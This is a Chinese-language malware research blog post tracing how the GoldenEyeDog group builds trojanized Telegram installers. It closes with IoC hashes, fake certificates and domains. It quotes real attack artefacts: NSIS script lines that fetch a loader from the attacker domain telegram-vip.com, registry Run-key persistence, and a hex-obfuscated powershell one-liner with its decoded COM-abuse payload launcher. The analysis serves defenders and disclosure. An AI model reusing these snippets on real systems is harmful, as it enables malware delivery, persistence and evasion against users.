---
title: 追蹤看門狗集團：Telegram 捆綁木馬程式的多種型態分析
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2021-01-20 23:46:39
categories: Research
thumbnailImage: thumbnail.png
coverImage:
keywords:
    - Telegram
    - Trojan
    - Malware
    - 看門狗
    - 金眼狗
tags:
    - Telegram
    - Trojan
    - Malware
---

繼前一篇 [分析一個加料的 Telegram for Windows 中文版安裝程式](https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/) 之後，陸續追蹤到 2021 現在，該集團仍然持續在活躍的行動中。對於偽造 Telegram 網站誘使使用者下載捆綁木馬程式的攻擊手法，在短時間內便發展出多種不同的型態，持續的改進其隱蔽手法和感染方式。<!-- more -->

<!-- toc -->

## 背景
陸續有其他安全廠商針對該集團的攻擊發表相關文章：
- 2020/11/09 [金眼狗组织水坑活动：针对Telegram用户的定向攻击](https://www.secrss.com/articles/26865)
- 2020/12/15 ["看门狗"团伙远控木马投毒计](https://www.anquanke.com/post/id/225621)
- 2021/01/08 ["伪装者"活动:针对Telegram特定用户的攻击](https://zhuanlan.zhihu.com/p/281462756)

可以得知其背後可能是屬於 金眼狗 集團（GoldenEyeDog），又稱 看門狗 集團，長期透過偽造通訊軟體網站或釣魚郵件攻擊特定族群。偽造 Telegram 中文版網站誘使使用者下載捆綁了木馬程式的 Telegram 便是[前一篇文章](https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/)所說的內容。

{% image fancybox center p1.png "Figure 1. 「看門狗」的名稱來自於樣本包含的 PDB 路徑" %}

在這段期間持續觀察的過程中，發現該集團在短時間內積極的嘗試了多種手段試圖規避檢測，包括：
- 使用名稱相似的假簽章誤導使用者
- 使用「簽章竊取」的手法盜用官方 Telegram 的簽章
- 改變安裝程式的打包方式
- 利用 Windows COM 界面繞過 UAC
- 使用合法且具備正常簽章的程式搭配 DLL Side-Loading 的手段
- 使用軟體保護工具（加殼）
- 加入 anti-debugger / anti-vm 的手法來規避分析

## 真假簽章
CertificateName|SerialNumber|ValidFrom|ValidTo|
:|:|:|:|
Adobe Inc.|01|2020-07-13T12:54:42+00:00|2022-07-03T12:54:42+00:00
Driver Information Technology Co., Ltd.|81 3b 66 fe d5 8a ab 24 d0 2b 65 a9 30 1f 61 3a|2020-09-04T00:00:00+00:00|2021-05-22T23:59:59+00:00
OORT inc.|02 bf 32 f9 ab 47 2e d1 cf 33 a2 7c 06 f9 b3 b9|2020-09-25T00:00:00+00:00|2021-09-22T23:59:59+00:00
OORT inc.|53 78 c5 bb eb a0 d3 30 9a 35 bb 47 f6 30 37 f7|2020-09-29T00:00:00+00:00|2021-09-22T23:59:59+00:00
OORT inc.|98 be 45 2e da f1 46 4a 38 06 79 06 81 0b 4e b4|2020-09-30T00:00:00+00:00|2021-09-22T23:59:59+00:00
OORT inc.|ec f1 57 7f dc f2 f9 f0 30 f9 d7 12 09 99 00 ab|2020-10-15T00:00:00+00:00|2021-10-12T23:59:59+00:00
LOGMEIN, INC.|1c 0d 4a 65 8b eb 7c b2 e6 f9 16 d9 b0 ef f7 20|2020-11-05T00:00:00+00:00|2021-11-03T23:59:59+00:00
LOGMEIN, INC.|d6 bb fa 3c 06 db 6f 44 7e 59 56 3d 34 9d dc b1|2020-11-12T00:00:00+00:00|2021-11-03T23:59:59+00:00
Google LLC|01|2020-11-12T13:11:49+00:00|2021-11-12T13:11:49+00:00
LogMeIn, Inc.|eb 6c e3 39 df c4 6c 48 ab 44 67 1b d6 38 4e 9f|2020-11-16T00:00:00+00:00|2021-11-16T23:59:59+00:00
LogMeIn, Inc.|84 f4 2d 39 2e ab 89 6c fd c9 46 62 40 54 e0 8e|2020-11-27T00:00:00+00:00|2021-11-16T23:59:59+00:00
Cockos Incorporated|01|2020-12-17T04:09:15+00:00|2021-12-17T04:09:15+00:00
Beijing Baidu Netcom Science and Technology Co.,Ltd|01|2020-12-18T10:36:33+00:00|2021-12-18T10:36:33+00:00
Beijing Kingsoft Security software Co.,Ltd|01|2020-12-18T10:51:25+00:00|2021-12-18T10:51:25+00:00
SHENZHEN THUNDER NETWORKING TECHNOLOGIES LTD.|01|2020-12-18T13:30:06+00:00|2021-12-18T13:30:06+00:00

上面表格是根據 ValidFrom 做排序，從我收集到的樣本中整理出來的。整體來看，看門狗集團除了冒用一些軟體開發商的名稱來建立簽章以外，也會使用改變大小寫的方式來混淆使用者的辨別。

除此之外值得一提的是，該攻擊者也使用過「簽章竊取」的手法來盜用官方 Telegram 的簽章。
{% image fancybox center p2.png "Figure 2. 簽章竊取的結果" %}

關於簽章竊取的手法可以參考：
- https://github.com/secretsquirrel/SigThief
- [Authenticode签名伪造——PE文件的签名伪造与签名验证劫持](https://3gstudent.github.io/3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81/)
- https://github.com/aaaddress1/SignThief


使用簽章竊取手法盜用官方簽章的樣本：

SHA256|Compile Time
:|:|
ec99947be1de325fe151edbf46535cc508ab65dd22778213c3cafcfeb9cb8c91|2020-12-30T14:24:00|
b15dd01ddcebd7c81d437151990e591ddce18dcb5f611654c3cd56404620b9f9|2020-12-02T07:12:01|
08b6dfa7ae14d00adbc97d91da9a3c7a110f473daf0cd08b58a768dd9b9e0fa3|2020-11-24T15:35:53|
1c66307a3d89d758fba6979fd5e36bb904bc94c2f66d1587d0a89f2a8a87bb81|2020-11-22T09:46:10|

## 安裝程式的改變
在近三個月的時間裡，光是偽造的安裝程式本身就有許多不同的型態，攻擊者積極的嘗試使用不同的安裝系統來包裝木馬程式。

### Advance Installer
這個型態是我在做關聯分析的時候往回找到的，使用 [Advanced Installer](https://www.advancedinstaller.com) 來打包安裝程式。從 Virustotal 的樣本上傳時間來看是在 2020 年 10 月初，大致和接下來 NSIS 打包的樣本差不多時間出現。可以透過 [UniExtract2](https://github.com/Bioruebe/UniExtract2) 將包裝內容解開，例如：
```
. 
├── CommonAppDataFolder               // 對應到 C:\ProgramData
│ ├── fff.reg                         // 透過 HKCU\Software\Microsoft\Windows\CurrentVersion\Run 實現持久化
│ ├── Server.lnk                      // regedit.exe /s C:\ProgramData\fff.reg
│ └── test.url                        // file:///C:/PerfLog/AddInProcess.exe
├── Telegram.exe                      // 正常的 Telegram
├── TgCn.msi                          // Advanced Installer 的安裝啟動器
├── Updater.exe                       // 正常的 Telegram Update
└── WindowsVolume                     // 對應到 C:\
    └── PerfLog 
        ├── AddInProcess.exe          // reflective Backdoor loader
        └── AddInProcess.exe.config
```

> Advanced Installer 特別的資料夾名稱對應實際位置可參考官方文件：https://www.advancedinstaller.com/user-guide/folder-paths.html

在安裝的過程中，除了將上述資料夾內的檔案放置到對應的位置以外，透過 Advanced Installer [Registry](https://www.advancedinstaller.com/user-guide/registry.html) 的設定將 payload 寫入到 `HKEY_CURRENT_USER\Software\<COMPUTERNAME>`，後續由 `AddInProcess.exe` 透過 .NET `Assembly.Load` 的方式載入。

除此之外，也有部份樣本具備檢測虛擬機的能力，查閱 Advanced Installer 的官方文件後發現確實是有這個 [功能](https://www.advancedinstaller.com/user-guide/launch-conditions-system.html) 可以啟用的，開發者可以在 Launch Conditions 裡勾選 `Prevent running in virtual machines`。

{% image fancybox center p3.png "Figure 3. Advanced Installer 檢測到虛擬機環境拒絕安裝" %}

### NSIS
NSIS ([nullsoft scriptable install system](https://nsis.sourceforge.io/Main_Page)) 打包的安裝程式可以使用 7-zip 直接解壓縮就能得到還原的安裝腳本 [NSIS].nsi 以及打包的檔案。7-zip 在 9.33 的版本加入了自動反編譯 NSIS 腳本的功能，但又在 15.06 把這個功能拿掉了，所以要注意 7-zip 版本必須介於這兩者之間。

#### NSIS Type 1
使用 NSIS 打包的第一種版本，基本上和使用 Advanced Installer 打包的型態內容大同小異。

接下來的 NSIS Type2 和 Type3 便是前一篇文章 [分析一個加料的 Telegram for Windows 中文版安裝程式](https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/) 所敘述的內容，但是額外發現了一些細節。

#### NSIS Type 2
Type 2 和 Type 1 相比最大的不同在於，寫入機碼 `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` 實現持久化的動作不再經由釋放 `*.reg` 檔案之後再做匯入，而是使用 NSIS 腳本實現：
```sh
WriteRegStr HKCU Software\Microsoft\Windows\CurrentVersion\Run telegramCnService C:\PerfLog\AddInProcess.exe
```
但反而寫入 `HKEY_CURRENT_USER\Software\<COMPUTERNAME>` 的 payload 獨立成檔案 `ns.reg` 落地後再使用 NSIS 腳本呼叫 `regedit.exe` 匯入。

NSIS 腳本片段：
```sh
# Replace 123456 to <ComputerName> from ns.reg then use regedit.exe to import
ReadRegStr $R1 HKLM SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName ComputerName
TextReplace::_FindInFile /NOUNLOAD $INSTDIR\ns.reg 123456 /S=1
TextReplace::_ReplaceInFile /NOUNLOAD $INSTDIR\ns.reg $INSTDIR\ns.reg 123456 $R1 "/S=1 /C=1 /AO=1"
Exec "regedit.exe /s $\"$INSTDIR\ns.reg$\""
```

#### NSIS Type 3
從 Type 3 開始，攻擊者不再把相關的惡意程式打包進安裝程式裡，相反的，所有的惡意程式在安裝過程中才會透過 NSIS 腳本額外下載下來。

##### NSIS Type 3-1
其中又可以細分 Type 3-1，這個版本和 Type 2 相同，但相關的檔案在安裝過程才會額外下載下來。

NSIS 腳本片段：
```sh
# Download loader and registry file
InetLoad::load /BANNER "" "Cameron Diaz download in progress, please wait ;)" http://www.telegram-vip.com/index2.php cnPath.exe
InetLoad::load /BANNER "" "Cameron Diaz download in progress, please wait ;)" http://www.telegram-vip.com/index3.php ns.reg
```

這邊下載的 `cnPath.exe` 其實就是前面的 `AddInProcess.exe`，在 NSIS 腳本中也可以看到下載後將它重新命名放到指定的位置。

NSIS 腳本片段：
```sh
# Move $INSTDIR\cnPath.exe to C:\PerfLog\AddInProcess.exe
StrCpy $R0 $INSTDIR\cnPath.exe
StrCpy $R1 C:\PerfLog\AddInProcess.exe
System::Call "Kernel32::MoveFileA(t R0,t R1)"
```

##### NSIS Type 3-2
Type 3-2 開始有了重大的改變，在安裝過程中一樣透過 NSIS 腳本下載一個解壓縮程式 `winzip.exe` 和一個壓縮檔，使用 `winzip.exe` 來解壓縮。


另外，在這個版本也開始發現到使用合法程式搭配 DLL Side-Loading 來執行惡意程式的手法。例如 `066864a2eab99d8821025b976ea26280c86e7db584b02df1d6230b3e40786fde` 這個樣本會釋放以下的檔案：
```
// SHA256 066864a2eab99d8821025b976ea26280c86e7db584b02df1d6230b3e40786fde
.
├── cfwd2.dat           // used to verify
├── cfwd3.dat           // used to verify
├── gamecap.exe         // legitimate executable loader from 騰訊視頻 (QQLivePlayer.exe)
├── module_cfg.bin      // payload
├── QLMainModule.dll    // DLL Side-loading, with fake "Google LLC" certificate
└── VMProtectSDK32.dll  // legitimate DLL
```
主程式 `gamecap.exe` 是一個來自騰訊的合法程式，會呼叫來自 `QLMainModule.dll` 的匯出函式 `QQLiveWinMain` 開始感染流程。第一次執行時首先檢查 mutex `gamecap` 是否存在，接著驗證 `cfwd2.dat` 的檔案內容，沒有問題的話便建立一個自己新的程序。接下來第二次執行時確認 mutex 已經存在，接著檢查 `cfwd3.dat` 和 `module_cfg.bin` 的檔案內容，沒有問題後才會透過 HTTP 請求下載後續要注入的 payload，在記憶體中載入執行。

這裡 DLL Side-Loading 的程式來自騰訊只是其中一個例子，也可以是其他任意具有 DLL Side-Loading 弱點的程式。

同時，這裡第一次看到 `VMProtectSDK32.dll`，攻擊者開始嘗試使用 VMProtect，這在後面會另外提到。

### Windows MFC
在 2020/11/24，我追蹤到使用 [Windows MFC](https://docs.microsoft.com/en-us/cpp/mfc/mfc-desktop-applications) 框架重新撰寫的安裝程式。從這開始，感染流程又有了新的變化，並且開始加入了一些不一樣的規避手法。

#### MFC Type 1
從這個型態開始，攻擊者再次將大部分惡意程式包含在安裝程式中，在安裝期間釋放到指到位置，並且在樣本中嵌入 base64 字串來執行混淆的 powershell script。

其中一種還原前的內容：
```sh
c:\windows\system32\cmd.exe /c " echo\ -join ( ( 53,74 ,61 , 72, 74 , 20 , 43 ,'3a' , '5c' , 50,72 ,'6f',67 ,72, 61, '6d', 44,61 , 74 ,61,'5c' ,52 , 65,63 ,'6f' ,76,65,72,79,'5c',73, 65, 74 ,75 ,70 , '2e' , 65, 78, 65 ,'3b' ,'5b',53, 79 ,73 , 74 ,65 ,'6d','2e', 41 , 63,74 , 69 , 76, 61 , 74 ,'6f' ,72,'5d','3a', '3a',43 , 72 ,65, 61 ,74,65 ,49 , '6e' , 73 ,74 , 61, '6e', 63, 65, 28, '5b',54,79 ,70 , 65, '5d' ,'3a', '3a' ,47,65 ,74 , 54,79, 70,65,46,72 , '6f' ,'6d', 43, '4c', 53,49 , 44, 28 ,27, 39 , 42 , 41, 30 , 35,39 ,37 ,32 , '2d', 46, 36,41, 38 , '2d' , 31,31 ,43 , 46,'2d' , 41 , 34 , 34, 32 ,'2d',30 ,30 , 41 ,30,43 ,39,30 , 41, 38,46, 33 ,39 ,27,29 , 29 , '2e',69 ,74, 65 , '6d' ,28, 29 , '2e' ,44 ,'6f' , 63 , 75 , '6d', 65 , '6e', 74, '2e' ,41 ,70,70, '6c' ,69 ,63, 61 ,74 , 69 ,'6f', '6e','2e' ,53, 68 , 65 ,'6c' , '6c' , 45, 78, 65,63,75, 74,65 , 28,22, 61 ,74 ,74 , 72,69 , 62, '2e', 65,78 ,65, 22,'2c' ,22,43 , '3a','5c', 50,72,'6f', 67,72 ,61 ,'6d', 44, 61, 74, 61 , '5c' ,52 , 65 , 63 , '6f' ,76, 65 , 72 , 79,20,'2b', 73, 20 , '2b' , 68 ,22,'2c',22, 63 , '3a','2f' ,77,69, '6e' ,64, '6f' ,77,73,'2f',73, 79 ,73 ,74,65, '6d',33 ,32 ,22 ,'2c',24 ,'6e', 75 , '6c', '6c', '2c' ,30 , 29 ,'3b', '5b',53,79,73 , 74 , 65,'6d' , '2e', 41, 63 , 74,69 , 76,61 ,74 , '6f', 72, '5d' , '3a' , '3a' ,43, 72 , 65,61 ,74, 65,49, '6e' ,73 , 74, 61,'6e' , 63 ,65, 28, '5b',54 , 79 ,70,65,'5d' , '3a','3a' , 47 ,65 ,74 ,54,79 ,70, 65 , 46,72, '6f' ,'6d' , 43 , '4c',53, 49 ,44 ,28 , 27 ,39, 42 ,41, 30,35, 39 , 37, 32, '2d' ,46,36 ,41, 38, '2d' ,31 ,31 ,43 ,46 , '2d', 41, 34,34 ,32 , '2d' , 30, 30 ,41 ,30 ,43 , 39,30,41 , 38, 46 ,33, 39 ,27,29, 29 ,'2e' ,69 ,74 , 65 ,'6d' ,28 ,29 ,'2e' , 44 ,'6f',63,75,'6d', 65,'6e',74 , '2e' , 41, 70 , 70, '6c' , 69, 63 , 61 ,74 , 69 ,'6f','6e' ,'2e' ,53 ,68 , 65,'6c' , '6c' , 45,78,65,63 , 75 ,74 ,65 , 28,22 , 69 ,70, 63 ,'6f','6e' ,66, 69,67,'2e' ,65 , 78,65 ,22, '2c' ,22 ,'2f' ,72,65,'6c', 65 , 61,73 ,65, 22, '2c' ,22 , 63,'3a', '2f', 77, 69, '6e',64 , '6f' , 77 , 73 , '2f' , 73 , 79, 73 ,74,65, '6d' , 33 ,32,22 , '2c' , 24,'6e',75,'6c', '6c','2c', 30,29 ,'3b' , 53 , 74, 61 , 72, 74 ,'2d' ,53 , '6c' , 65 ,65, 70 , 20 , '2d', 53 ,65,63, '6f','6e' ,64 , 73,20 ,32, '3b' , '5b',53 , 79, 73, 74,65,'6d','2e' ,41,63 ,74, 69 ,76 ,61, 74, '6f', 72 , '5d' , '3a' ,'3a', 43 , 72 , 65 , 61 , 74 , 65 ,49 ,'6e',73 , 74 , 61,'6e' , 63 ,65,28 , '5b',74 , 79, 70 ,65 , '5d' , '3a' , '3a', 47 ,65 , 74,54 , 79 ,70 , 65 ,46 , 72 , '6f','6d',50,72 , '6f', 67 ,49 ,44,28 ,22 , '4d' , '4d',43 , 32 , 30,'2e',41 ,70 ,70 , '6c', 69, 63,61 , 74, 69 , '6f' ,'6e' ,22 , 29 ,29 , '2e',44, '6f' , 63 , 75 , '6d', 65, '6e',74,'2e', 41,63 , 74, 69 , 76,65,56 , 69, 65 ,77, '2e', 45 ,78 , 65,63, 75 ,74,65 ,53 , 68 ,65 ,'6c','6c',43 , '6f' , '6d','6d', 61,'6e' ,64, 28 , 22 ,43 , '3a','5c', 50 ,72,'6f', 67, 72 , 61 , '6d' , 44 , 61 ,74,61 , '5c',52 ,65 , 63,'6f', 76,65,72,79 ,'5c' , 53, 65, 72, 76 , 65, 72 , '2e',76 ,62 ,65, 22,'2c' ,22 ,30,22, '2c', 22, 30, 22, '2c', 22, '4d', 69 ,'6e', 69 ,'6d',69, '7a',65 ,64, 22 , 29 , '3b', 53,74 ,61, 72 , 74 , 20, 43, '3a' ,'5c' ,50, 72 ,'6f' , 67 , 72 ,61, '6d' ,44 , 61, 74, 61,'5c',52, 65 , 63,'6f',76,65, 72, 79 , '5c', 67, 61, '6d' ,65 ,63 , 61 ,70 , '2e', 65, 78 ,65, '3b', 53 , 74, 61 , 72, 74 ,'2d' ,53 , '6c', 65 , 65 ,70 ,20,'2d' ,53, 65 ,63, '6f' , '6e',64,73 , 20, 32, '3b' , '5b' ,53 ,79 , 73 , 74,65 ,'6d' , '2e', 41 ,63, 74,69,76,61, 74 ,'6f', 72 , '5d' , '3a','3a', 43, 72,65 , 61,74, 65 , 49,'6e' ,73,74, 61,'6e' ,63,65,28,'5b' ,54,79 ,70 ,65 ,'5d','3a' , '3a' , 47,65 , 74 ,54 , 79, 70 , 65,46 , 72, '6f', '6d',43 , '4c', 53,49, 44,28, 27,39,42,41 , 30, 35,39 ,37,32 ,'2d', 46 , 36, 41 , 38 ,'2d',31, 31 , 43, 46,'2d',41 ,34 ,34 , 32 ,'2d' ,30 ,30, 41,30 , 43,39 , 30 ,41 ,38, 46 , 33, 39 , 27,29,29, '2e' ,69 , 74,65 ,'6d' ,28,29 ,'2e' , 44, '6f',63, 75, '6d' , 65,'6e', 74 , '2e', 41 ,70,70 , '6c' ,69 ,63 ,61 ,74,69 ,'6f', '6e' ,'2e' , 53 , 68 ,65 , '6c' ,'6c' , 45 ,78,65 ,63 , 75, 74, 65 ,28,22, 69 , 70 , 63, '6f', '6e', 66 ,69, 67,'2e', 65 , 78,65 ,22 , '2c' , 22 ,'2f',72 , 65 , '6e', 65 , 77,22 , '2c' ,22,63 ,'3a','2f' ,77, 69 ,'6e', 64 ,'6f' ,77,73 , '2f', 73 ,79,73, 74 , 65,'6d',33 , 32 ,22, '2c',24 , '6e' ,75 ,'6c', '6c' ,'2c' , 30, 29 ) ^^^|foreach { ([convert]::toint16( ([string]$_ ) ,16) -as [char])} ) ^^^| . ( $shellid[1]+$shellid[13]+'x') | powershell -command $executioncontext.invokecommand.invokescript( ${input})"
```

> 混淆的方式不只一種，這邊僅舉其中一種為例。

還原後的內容：

```powershell
Start C:\ProgramData\Recovery\setup.exe;
[System.Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39')).item().Document.Application.ShellExecute("attrib.exe","C:\ProgramData\Recovery +s +h","c:/windows/system32",$null,0);
[System.Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39')).item().Document.Application.ShellExecute("ipconfig.exe","/release","c:/windows/system32",$null,0);
Start-Sleep -Seconds 2;
[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application")).Document.ActiveView.ExecuteShellCommand("C:\ProgramData\Recovery\Server.vbe","0","0","Minimized");
Start C:\ProgramData\Recovery\gamecap.exe;
Start-Sleep -Seconds 2;
[System.Activator]::CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39')).item().Document.Application.ShellExecute("ipconfig.exe","/renew","c:/windows/system32",$null,0)
```

這裡可以看到攻擊者首次使用 Windows COM 物件來提權執行命令，相關的攻擊手法可參考：[Abusing COM & DCOM objects](https://dl.packetstormsecurity.net/papers/general/abusing-objects.pdf)。

其他行為大致和前一型態相同，持久化的手法仍然是透過放置捷徑到 Startup Menu 的方式，魔改過的 gh0st RAT 本體會在後門執行時才會下載並載入到記憶體中執行。

#### MFC Type 2
Type 2 與 Type 1 最大的不同在於，捨棄了使用 base64 編碼的 powershell script，將所有內容內化到安裝程式的程式的邏輯中，並且使用 Stack String 搭配 XOR 等基本位元運算來隱藏相關的所有路徑 / 檔案字串。除此之外，原先經由 powershell script 濫用 COM 物件的手法也獨立成一個新的執行檔 `go.exe`，負責提權並且開始載入惡意程式的相關流程。

Type 2 最大的亮點在於，攻擊者在使用 Advance Installer 打包的樣本中曾經出現過檢測虛擬機環境的行為後，這次的型態再一次的加入了檢測虛擬機環境的動作，靠的是 WMI script 來檢測 CPU 的溫度。這個反虛擬機的手法在 2018 年的時候就有一個名為 GravityRAT 的惡意程式使用過，對該程式的分析可以參考 [Malware VM detection techniques evolving: an analysis of GravityRAT](https://www.andreafortuna.org/2018/05/21/malware-vm-detection-techniques-evolving-an-analysis-of-gravityrat/)。基本上 Hyper-V, VMWare Fusion, VirtualBox, KVM 或 XEN 都沒有支援這個監控資料，但是這個手法並不是完美的，文中也提到一些近期的硬體設備也同樣不支援提供 CPU 的溫度資料，這會使這個手法將實體機器誤認為是虛擬機從而躲過一劫，安裝程式開始執行後一旦偵測到處於虛擬機環境或是 debugger 環境，便會直接結束。

{% image fancybox center p4.png "Figure 4. 在虛擬機中無法取得 CPU 溫度" %}


### Software Packer
在 2020/12/22 ~ 2020/12/24 這個期間內（compile time），曾經發現 5 個樣本使用了 [VMProtect](https://vmpsoft.com) 或 [Safengin Shielden](http://www.safengine.com/downloads/get-demo) 做了加殼處理，其保護的內容為上述的 MFC Type。攻擊者可能是實驗性的使用加殼手段來防護原始碼或阻礙分析，在 2020/12/26 新追蹤到的樣本又不再使用加殼保護以後，截至撰寫本文時尚未發現其他有加殼的樣本。

## 結語
在這篇文章發佈時（2021/01/20），其實已經又追蹤到幾個更新的樣本，但再累積下去會一次寫太多內容，就先以近三個月前幾種大的型態為主來分享整個改變的過程。

在短短三個月內時間內，可以看到背後的攻擊者非常積極的在更新惡意程式，其感染手法雖然大同小異，但是規避的手法或是反調查的手段卻是越改越成熟。偽造通訊軟體網站只是看門狗集團的其中一個攻擊手段，其他還有釣魚郵件 / 直接 Telegram 群組散播惡意程式等。近來 Telegram 的中文使用者人數增加，有鑑於官方並沒有提供中文版的界面，很多人便開始尋找中文化的解決方案，正好中了攻擊者的意，透過 Google 廣告和網站 SEO，使用者會很容易搜尋或是直接在廣告看到，遭到誘騙上當。

{% image fancybox center p5.jpg "Figure 5. 出現在 Google 廣告的內容" %}

{% image fancybox center p6.png "Figure 6. 目前偽造網站的截圖" %}



這個攻擊行動仍然還在持續進行中，攻擊者也還在不斷更新他們的惡意程式，未來應該還有機會有下一篇文章 :)

## 附件：IoCs
Advanced Installer
- `0bf579a9c7c6a4b0dc58ab5372699b04601a783ea5f33fa62e4100b41be1e55f`
- `1f6e6d81d77ccb5bb0e7e2264f1fa021faad244ac68e942930e57133ee6da976`
- `56081f073519f7929c79bf8b88a4e4c257b31d67f8df9fa3f3d1793ee3da91d7`

NSIS Type 1
- `971ca26b8e1e4e0cd9b009812f0084ade65174e9f4d1579fd05ae011225b1e7e`

NSIS Type 2
- `1d6677b629e65e6a9341686c5d219f07383b496c8796bcf8630f5dde96dbbad3`
- `1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8`
- `214a3a1ac1f42a49bf837e2d1d76ff53e6db759032206156e01f78d9db1011f5`
- `2a127b774d59ba560bc6131b84a71b8e3535be41c1c4b10fc8084724b2dded92`
- `c6f5aa44b385578e2876a2aa6d1e9186cae54dc359164a03a8bcd2bb59dbce8f`
- `f6c622b152b6d4fa362d2900eba8934dcae3f3d958b792524cf48bcbc7d08140`

NSIS Type 3-1
- `35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba`
- `57dd6a698440752a4b5a26e497531ebfdd6bc565c265652b60f29a505481286a`

NSIS Type 3-2
- `273c9116367bd5d6c6e5b40b0ad287776b34db67d5656cf985c5761d3ea1714c`
- `340aa68450e42c11c8835739024b5d221a7793b1450e014f33cc99fe1d08fc51`
- `dc5d1fb0f60c1d2c2b7500e6a3f2c3e0b3e1465f5faf2d6b107baf4832751837`
- `eede9bebbb5e411b98ed3ab22287ca405e978ce64edd2c5b488bcb61e979965d`

MFC Type 1
- `08b6dfa7ae14d00adbc97d91da9a3c7a110f473daf0cd08b58a768dd9b9e0fa3`
- `1c66307a3d89d758fba6979fd5e36bb904bc94c2f66d1587d0a89f2a8a87bb81`
- `399626c3147001fd79cbbf3e3e49da69e662a67a4310196419f6eb3892b05cc4`
- `3dd27291ecc80ded11eded0b4f8deb3a727a83538f50edb7a5b09b002241f5ea`
- `9e14301f185291b9a50bf32a511ee6561aac3248058d1f414dfd6e42a07326d9`
- `b15dd01ddcebd7c81d437151990e591ddce18dcb5f611654c3cd56404620b9f9`

MFC Type 2
- `005e381cb39d53c4574f418f8fd4349fa2ad582950b62b08e8064be580f11d3c`
- `04acd866ea0db5b1941601f7045f283841d80aaefa12bb5819027ab34d53a578`
- `0dc1dfbe8876f73ff5541ef95b28424c898cd0356ea1076ceba71d938dd1542f`
- `1d496cf700989c37d8909de3aec78bc09f8f2d3313833f8d3977ffacc4e8562a`
- `1d691137733a5a851baf3e2543b003b7b8d930919a22dc2be91f42bc2456683b`
- `2e29c4fdc92aef0afb417e5beb2ad97bf0728c70a00b7ef3a891168fcda53fc6`
- `31cd9a8af5f968616ad1de617090cd5f8f27fbdd4003787b0afceb8688dadb5a`
- `3d792cde223521f0eaa572e3d1047c1f7cede4723b1b94ce2caad43e1a1dbbd4`
- `3de50a7a18d077f6798c4a0f7f4e464a0465f550beb3ca1ce4d532200a097621`
- `43f05f360cfd3d5570044c249180ca69956348aa36cf29c35b512f621def0d7a`
- `4ffcdb1ea7b09a1e5acb62618e84282a5885700d6021bfd71a52a29a21c5dc2c`
- `545bfbc5ba031e9a618b1fd4335b4903b107d810810ada52cfd90f3dad0e0093`
- `5d824f213cb523fbf0d22821a7ecdc2ae4b236940dc2fd34b7c7da9e81a725c5`
- `60505f49062b3f9da11c4504b08de3d464fb9f61a6f6a4eaf0518aeb52f557e5`
- `65a4bf0651b6ccd9c6720d7544c7e152b135d6aa2b9613205a883943619b5623`
- `678a48647b4d29a8e910905308412e043b9f3c998e635f78b10fcbf88d8d11bc`
- `6b1b3c42e416585de92245baad11b6685764b7d8c62c68648015f0ca3940271f`
- `6d419d7d009a04faf99d749fdc89ad38fc9087ba14f459530b07cbf4cdacdd22`
- `79cbb0787121082bc579bd53fe3e66cdb894085bc7985c63eebdf97615095b6c`
- `7fb7752513ebb52d0a1e25cea30287e2fd28cf62f0d71a6c9557b74f2822cbad`
- `84e63e5ccb04af4af9728cfa0666e6cb3dc0dc5dfd8aad2c7c0e783ce29e01fe`
- `86175de725b6db0ba20bf2f182fdebce69962c53a80283866dc85ca97be26558`
- `ba62ffc87ceb56c4429b2920cfd4c799b85294c0a1c0173c6e1e814e173a8ad6`
- `bbbf5c0dadd05d330ac217800fc1e77608cb20b661cc9978efe75749016fb940`
- `c3d2c8a41be2751ee589a25c9121f88e884449b8353d250e9d5c6afb87cefaf4`
- `c404aa57d3539c077b77d1b7558ad45613e2ffc34982a88e48987ae1ef9828bf`
- `c6537b257f76dcbbc8b5f82be2278f243da19d185035142d41a08b4a9a7f607c`
- `ce6053b94ad5a0361cf3b40fb57b8428540a81b403929fee1c5dff63272e6505`
- `df78865d0ca7b4eb222bb8a615cb753c6ade24bb001fd4e4faa82ef107c0a00e`
- `fa5c0489f0669d0040267d5eae10771433cfc395da9de3a7ead8ce136c76b07e`

Software Pakcer Protected
- `8db626c808333c32afee3ea81af391762f5faad6c739ff885d2a5fd6b86cb8e4`
- `a3fd90794da97bd7840f1de9ac17c3834c3c24fa0b6bb20cc1f25564df3399b1`
- `b178ac5583677fa8174d73879d56caba35424cf4240f945c0c18e1f9f0a743a7`
- `d780a6a08cacb2e6e07deb4549c689e3fbaa1e526dedf42612ec77847b5e9758`
- `fd885c0cd5dc366d27cf0deb544e7c8887007d8d9a753979793de3e7affeb7c2`


Domain|Creation Date|
:|:|
bensonman.run|2020-07-07T00:10:21Z|
telegram-vip.com|2020-09-21T06:44:59Z|
telegramvips.com|2020-10-31T13:34:04Z|
ii-telegram.com|2020-11-04T03:54:40Z|
yy-telegram.com|2020-11-04T03:54:40Z|
mm-telegram.com|2020-11-04T03:54:40Z|
a2-telegram.com|2020-11-05T06:31:22Z|
